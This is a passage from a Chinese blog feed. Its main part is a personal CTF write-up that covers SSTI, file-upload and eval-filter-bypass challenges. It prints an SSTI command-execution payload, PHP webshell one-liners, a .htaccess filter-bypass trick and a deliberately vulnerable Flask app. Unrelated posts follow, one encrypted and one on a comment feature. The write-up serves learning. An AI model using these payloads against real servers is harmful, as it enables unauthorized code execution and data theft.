<br></code></pre></td></tr></table></figure><p>可能是我成分太低了，真不明白下一步要干什么，大概知道是要爆破参数，<br>再去看了wp才知道有专门爆破参数的工具 Arjun<br>在pip试了一下发现直接就有在pip上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">arjun -u http://192.168.75.128:5000/114514 -m get<br><br> Scanning 0/1: http://192.168.75.128:5000/114514<br> Probing the target <span class="hljs-keyword">for</span> stability<br> Analysing HTTP response <span class="hljs-keyword">for</span> anomalies<br> Logicforcing the URL endpoint<br> parameter detected: name, based on: body length<br> Parameters found: name<br></code></pre></td></tr></table></figure><p>然后发现一个name参数<br>随后尝试：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">http://<span class="hljs-number">192.168.75.128</span>:<span class="hljs-number">5000/114514</span>?name=<span class="hljs-number">1</span><br><br>你好 <span class="hljs-number">1</span>！<br></code></pre></td></tr></table></figure><p>那应该就是ssti注入了<br>掏出祖传焚靖</p><p>直接梭出来payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">cycler.next.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然而尝试了直接 cat &#x2F;flag 发现不能回显了，估计是有waf<br>再回想题目说某个参数能直接拿到源码<br>但arjun只爆出来了一个啊，随后又试了source&#x3D;1，还是不行<br>去看黄豆的wp，发现是要source&#x3D;6969 。。。</p><p>随后成功拿到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, render_template_string<br><br>app = Flask(__name__)<br><br>FLAG = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read().strip()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stage1</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;head&gt;</span><br><span class="hljs-string">    &lt;src</span><br><span class="hljs-string">        &lt;title&gt;&lt;/title&gt;</span><br><span class="hljs-string">        &lt;!-- ï¼/s3c0nd --&gt;</span><br><span class="hljs-string">    &lt;/head&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/s3c0nd&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stage2</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;head&gt;</span><br><span class="hljs-string">        &lt;title&gt;S3c0nd&lt;/title&gt;</span><br><span class="hljs-string">    &lt;/head&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;h1&gt;only fuzz(number)&lt;/h1&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/114514&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stage3</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br><br>    template = <span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;head&gt;</span><br><span class="hljs-string">        &lt;title&gt;éå½åè¾ã®ä½æ&lt;/title&gt;</span><br><span class="hljs-string">    &lt;/head&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;h1&gt;ä½ å¥½ <span class="hljs-subst">&#123;name&#125;</span>ï¼&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;!-- å¬è¯´è®¿é®è¯¥é¡µé¢çægetåæ°çæä¸ªæ°å¼å¯ä»¥çæºç  --&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;source&#x27;</span>) == <span class="hljs-string">&#x27;6969&#x27;</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&quot;latin-1&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">return</span> Response(f.read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> render_template_string(template, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>然而却没有waf？<br>看了wp也是说没有过滤的ssti，用wp的payload也没有反应？！<br>该不是我的docker环境有问题吧？<br>结果试了一大堆办法都没用，最后进入docker容器后台，发现flag里根本没东西。。。</p><p>自己写上flag{aidemofashi}后就可以ssit出来了，没有waf。  </p><h2 id="ezpuload"><a href="#ezpuload" class="headerlink" title="ezpuload"></a>ezpuload</h2><p>fuzz一下，发现是图片内带有&lt;? 的就不让上传，这也会导致正常图片上传不了，正常文件都可能会有排列组合到&lt;?的情况<br>当时做的时候是发现会直接删除文件名中的 ‘php’ 和 ‘htaccess’</p><p>然后试了如下  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?=</span>  是 <span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> 的简写<br>不行  <br><br>&lt;% <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]); %&gt;  <br>需要asp_tags=On  <br>不行  <br><br>GIF89a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;<br>需要short_open_tag=On<br>不行  <br></code></pre></td></tr></table></figure><p>没思路了，去看wp<br>发现是用htaccess的方法  </p><p>然后尝试套了三层就成功了：<br>.hththtaccessaccessaccess<br>但是尝试了官方的解法发现使用：  </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">AddType application/x-httpd-php .jpg  <span class="hljs-comment">//将jpg后缀的文件当做php执行  </span><br>  php_value auto_append_fi\<br>  le <span class="hljs-string">&quot;/flag&quot;</span>  指定一个文件，该文件的内容会在每一个 PHP 脚本执行完毕后自动包含（<span class="hljs-meta"><span class="hljs-keyword">include</span>）并执行。</span><br></code></pre></td></tr></table></figure><p>返回500错误，也搞不明白问题是啥<br>在我这环境下一直复现不出来。<br>没办法了  </p><p>总结一下官方的思路是：<br>利用会删除不合规后缀名，用重写的方式传入.htaccess。<br>然后在利用文件包含的方式拿出flag。</p><h2 id="ezpassby"><a href="#ezpassby" class="headerlink" title="ezpassby"></a>ezpassby</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$test</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$test</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;oh nonono hacker!&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>这个当时看了，没做出来，看黄豆wp，<br>利用system apache_request_headers join，<br>无法直接在test参数传违禁词，能利用apache_request_headers 来在请求头里写<br>问了一下千问，确实只能在apache上用，nginx用getallheaders。  </p><p>又是复现不出来，命令结果没出来，在win下试了，文件能出来，但是写不进东西。。。  </p><h2 id="Pickle♥dill"><a href="#Pickle♥dill" class="headerlink" title="Pickle♥dill"></a>Pickle♥dill</h2><p>这个因种种原因就完全复现不出来了  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Plan2025/9to12</title>
    <link href="/2025/09/05/Plan2025-9to12/"/>
    <url>/2025/09/05/Plan2025-9to12/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1485350483df38d8c09725aa750fb8872aa12cf08152d4c1d6be05eec3ce0a13">ac84844b14d8816060dbf8be1ca4bb2e54a6f8fee3e3eb45305502ab2d905ccadcf3633d7868f504c0c6cc9494b921107b2d35b97a72cbeb7bde994788fa593766dde062b81766439ad9a1e96ef89b724031a091a40cb06c04e7b501625f81ff126bf4b542583384351ed81ba9956538b10f96dfa8d5afb094ec0b6aff30bfa83fc46a11bea82d0934813313b5bf674208f97607140b605716746e33a2c666ab70a6f6c746a61f7ee3799b360c747317db57c6db6a3f5eee95fa690ded61ac6ca008dc9f6afb139361c096b0ac4a52e07c317f8c24a864f4387e96b1537a66b6341aba7eccdb52e0257670aea49433508205cf1c5ed58736690be5e20288452b1d024d2a6d9d182c923760c9f5805ed54a9d950eda53364b0bc399f6e6d5ffd0604a2445676fde9260783b72ca876a45ef2f6f92f9ec114aaae45526ffef941c93296e211841f969f8873983ad05ea5b9b9fa912cad24080186d6766138f019e599080e59a4976ea45d67452a373264e5127062725476139c53798c7fb08ad21fffe428ce61ceedbccd25ba3118e4f9c3b2bc83e55badd5f4af9dce70a0c940c34fb6219ee77788444954c715156daf688075e440b24c9528a48dec730f4a18784beedb3021dc1ea9cc5f1d96617fd32e9b905aa049fc0f0fd9418bddfbf7184ccb3417f535da6664d19b4d88fa9179e393b076bb49c50ab9d54ee28e0242b76e847a17426a58f165f4b9572e0263ce65c83f803fdf7e37b5874688375ff639be2881535ff419cc7487890774f1c33d43795a444c4c2f602a23fff4c32fd999d4d5e7286d401ae274ab5a7129179f7ca80a6f6a54edf705862ad8c8e0bd58b24545471b1b37d5a63cca2e11bc3ae0a94701d1105ed4b148e3e061ef272052ab6b4e503532f39a92f21d7d0ab95ec585e2de97a0ce2f13f0cc31fe5417ccc71ccf4dfc3d025b43a6e0b47f012cff6fa2068d0529f48ba5ba49a0a7386fc3340713691f13dc978b0b5929f1dc44b7e4fdedf2d1bb5ed332fb8c73f617a1e73827f8245c3a22aecb9df9d46fcae21f0a5c473a3cd4162a7cfe1f9a65748426fb60bfe5805f6c15eccda8bf86387cb1545e4491e8a341126cc07437c62a8eb2f013026dbe0c216cef0f09edaeb874f2742786b8c77390ab92889b70d2bae98beb77018f259125433f822d6c0a2dd000c0cffc00efa1f13eb930c45cbca63a86cd05e8ad23e7066c9b6c34bae12d4dcbb1022093cee29d85b2253f0be9a776b8bfb20afe437bfba69e3ce22eb195600063abe3e9943207fe58675179fb11a51fe8a1c527317abf9882512268750243f0715c90fd4f2de46ef11572d7373ff700877ad57f4b74fd0448e8a3c2a45c20b0840fff4dc8bfff7de3d9a873ede04682afbfdf9cc4c798cffd5783f36015f7c2279e52cd213d3a116ea7c9a0b19d629d3b0d28315eeadfcc27ebb29016748cc4dc33a9bc2a595f174a2ed1a473615779665719f0ac1862c9ee7088711a436638ceef5b28176ab6fde72ae0ad7ac6ecaa67b689cffa3d4c7dadf003300055824ab96df1d138f1becd431b9fe00788ef0c389e64d135e1a840bce95a5cf3da378d95baafd519751fb5cde262c6ff467e7c40daa670e238c4495fd8077cb7ad160dde2c29379c3e4e861d2ae0d57ab582ade49bb5351cdb5710b4c94a3769ec161af829e9e0aa621515bcc0d169d69877f9835326116306f1da8bbc7a41a1d4d45ac5bd27d32ce24c8236bffeca012e464dcb630aeedc0659cdd383905c12ba77eded3ff953a92b7489a5dd8e9ec93e2d8a926e2191b8a1266e80f9acbbb194b7d19a9ecf1e6c9f9d61f3bfae5d59f36980852cc3a8f7ad36c434ff8db89f0f112687fd9c17cc5200f9f98f9ab394ae3df66de990ad1e5072e83d2af3398df89a30152c3489467dbfd62dca1c9099e19d91301348ca1808d340d810cfa5f20f801ab0fceaf2d1ea670c71d49707c58f04985b45094df3b8ad99bd936826149a318fbae46618579204042226c68448ce8121764e012ede680a8d61bb55f06e7419709fa3e3657c7e72d7008fbc3e72cbd2360646b8399f075dc5a03e600c2c220fc574b713aa0013a890fd0b64b6697fa3c6e58717ce6e664e35efe38549885da74100eb23eed41100308d7c8dcfbc81d7f5eee8f4478c6832d74c68bc310656f3631a05e1ed45ee5180b0decf750a0c89a2eb5ea7bbabf4b56307e26d50c5f7d9c0342287f2c56f6f980ffd5849fa959f2e34d8358de64ba2b31ebb20192cf9af9bac9e2f67cd3cb993fd51d6b9287db9ad1a652f3c0b947454886f8cfc1fcabc549ff4279f1c9a078e5a1125c2054bb31dc766e1ec4a217883cea8c6b262e548d5a5968c99f31eb21156656298e9a867c4f2f4bfc1061981ba3e801b57caa8f00a53f1555710ae9b3d3a3e9503c3e6de9febd3147393d232b3cfa204482b0d0b29720a9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>plan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>主页前端留言功能实现</title>
    <link href="/2025/08/15/%E4%B8%BB%E9%A1%B5%E5%89%8D%E7%AB%AF%E7%95%99%E8%A8%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/"/>
    <url>/2025/08/15/%E4%B8%BB%E9%A1%B5%E5%89%8D%E7%AB%AF%E7%95%99%E8%A8%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="网站留言功能实现"><a href="#网站留言功能实现" class="headerlink" title="网站留言功能实现"></a>网站留言功能实现</h1><p>前些天给网站升级了留言功能，但是又不想做数据库，于是想到了拿b站动态的评论区做留言的想法<br>这样一来不用给服务器加php，二来又不用建数据库等等，全程在后面跑python脚本，安全性感觉是无懈可击☺  </p><h2 id="评论数据爬取和处理"><a href="#评论数据爬取和处理" class="headerlink" title="评论数据爬取和处理"></a>评论数据爬取和处理</h2><p>先是要拿到指定评论区的数据，上网上查了一下，发现有b站的api可以获取数据，但是在服务器试了一下竟然是被拒绝链接的，看了一下别人先成的b站爬取脚本，感觉又是要定时改cookie又是要防止b站检测你运营商的玩不动  </p><p>但是还好是直接用bp来找，直接找到了数据的链接，而且不用登录能获取完整的评论，获取的原始数据是这样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span 